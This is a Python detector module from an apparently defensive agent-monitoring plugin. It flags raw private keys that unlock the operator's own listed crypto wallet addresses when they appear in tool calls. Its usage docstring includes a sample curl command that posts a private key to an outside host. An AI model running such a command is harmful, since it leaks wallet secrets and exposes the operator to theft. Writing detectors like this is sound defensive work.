"""Trader Shield's own-address check: a raw private key that opens one of the operator's OWN addresses.

64 hex characters alone look exactly like a transaction hash. With the operator's own
addresses listed in Trader Shield settings, a 64-hex value that derives one of them IS one
of their keys. The derivation is the pure :func:`detection.detect_own_wallet_keys`; this
detector only hands it the addresses of the mode in force (read once per hook call, in the
registry's snapshot) and drops what the labelled-key rule already said at least as loudly.

Usage::

    from plugins.blackbox.shields.trader.detectors import own_keys
    own_keys.detect("terminal", {"command": "curl -d k=<64 hex> https://x.dev"}, mode.current())
    # -> [Finding(identifier="secret:wallet-private-key", severity="critical", ...)] when it opens a listed address
"""

from __future__ import annotations

from typing import Any

from ....detection import Finding, detect_own_wallet_keys, detect_secret_exposure
from ....kernel import constants
from ...contract import ShieldMode
from .. import mode as trader_mode

#: The identifier both the labelled-key rule and this check raise.
WALLET_PRIVATE_KEY = "secret:wallet-private-key"


def _own_key_findings(tool_name: str, args: Any, active: ShieldMode) -> list[Finding]:
    """Raw keys of the operator's own listed addresses in this call, unless the
    labelled-key rule already raised the same finding at least as high."""
    found = detect_own_wallet_keys(tool_name, args, lambda: trader_mode.addresses(active))
    if not found:
        return []
    # WHY a second scan: the shield runs beside detect_all, not after it; the labelled-key
    # rule is re-asked only when an own key was found (rare), never on a routine call.
    rank = constants.SEVERITY_RANK
    labelled = [f for f in detect_secret_exposure(tool_name, args) if f.identifier == WALLET_PRIVATE_KEY]
    have = max((rank.get(f.severity, -1) for f in labelled), default=-1)
    return [f for f in found if rank.get(f.severity, -1) > have]


#: The shield's ``detect`` callable for this check. The body keeps the name it had in the
#: guard, so the move proof pairs the two and shows what changed.
detect = _own_key_findings
